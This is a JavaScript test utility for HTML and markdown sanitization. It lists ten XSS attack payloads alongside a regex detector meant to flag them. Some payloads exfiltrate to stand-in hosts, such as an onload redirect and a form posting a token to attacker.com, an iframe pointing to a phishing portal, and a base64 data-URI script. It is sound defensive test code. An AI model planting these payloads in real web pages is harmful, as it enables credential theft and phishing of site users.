/**
 * Markdown & XSS Testing Utility
 * Provides standardized attack vectors and verification routines for content sanitization.
 */

export const XSS_ATTACK_VECTORS = [
  {
    name: 'Raw script tag',
    payload: '<script>alert("XSS_01")</script>',
    expectedPurged: ['<script', '</script>', 'XSS_01'],
  },
  {
    name: 'Case-obfuscated script tag',
    payload: '<sCrIpt>window.leakCredentials()</sCrIpt>',
    expectedPurged: ['<sCrIpt', '</sCrIpt>', 'window.leakCredentials'],
  },
  {
    name: 'Image with onerror handler',
    payload: '<img src="invalid-image.png" onerror="alert(\'XSS_02\')" />',
    expectedPurged: ['onerror', 'alert(\'XSS_02\')'],
  },
  {
    name: 'Image with onload handler',
    payload: '<img src="/uploads/valid.png" onload="document.location=\'http://attacker.com\'" />',
    expectedPurged: ['onload', 'attacker.com'],
  },
  {
    name: 'Javascript pseudo-protocol in link',
    payload: '[Click Here For Report](javascript:alert("XSS_03"))',
    expectedPurged: ['javascript:alert'],
  },
  {
    name: 'Iframe injection',
    payload: '<iframe src="https://malicious-portal.org/phish"></iframe>',
    expectedPurged: ['<iframe', 'malicious-portal.org'],
  },
  {
    name: 'Object & Embed tags',
    payload: '<object data="exploit.swf"></object><embed src="exploit.swf">',
    expectedPurged: ['<object', '<embed'],
  },
  {
    name: 'SVG onload event',
    payload: '<svg/onload=alert("XSS_04")><circle r=10/></svg>',
    expectedPurged: ['onload', 'XSS_04'],
  },
  {
    name: 'Form and input injection',
    payload: '<form action="http://attacker.com/steal"><input name="token" value="secret"/></form>',
    expectedPurged: ['<form', '<input'],
  },
  {
    name: 'Data URI link execution',
    payload: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Tax Notice</a>',
    expectedPurged: ['data:text/html', 'base64'],
  },
];

/**
 * Validates whether an HTML string is free of dangerous XSS vectors.
 */
export function verifyNoXss(htmlString) {
  if (typeof htmlString !== 'string') {
    throw new Error('Expected HTML string to verify');
  }

  const forbiddenTags = [
    /<script\b/i,
    /<\/script>/i,
    /<iframe\b/i,
    /<object\b/i,
    /<embed\b/i,
    /<form\b/i,
    /<input\b/i,
    /<button\b/i,
  ];

  const forbiddenAttributes = [
    /\bonerror\s*=/i,
    /\bonload\s*=/i,
    /\bonclick\s*=/i,
    /\bonmouseover\s*=/i,
    /\bonfocus\s*=/i,
    /href\s*=\s*['"]?javascript:/i,
  ];

  for (const tagRegex of forbiddenTags) {
    if (tagRegex.test(htmlString)) {
      return { safe: false, reason: `Forbidden HTML tag detected matching ${tagRegex}` };
    }
  }

  for (const attrRegex of forbiddenAttributes) {
    if (attrRegex.test(htmlString)) {
      return { safe: false, reason: `Forbidden active attribute detected matching ${attrRegex}` };
    }
  }

  return { safe: true };
}
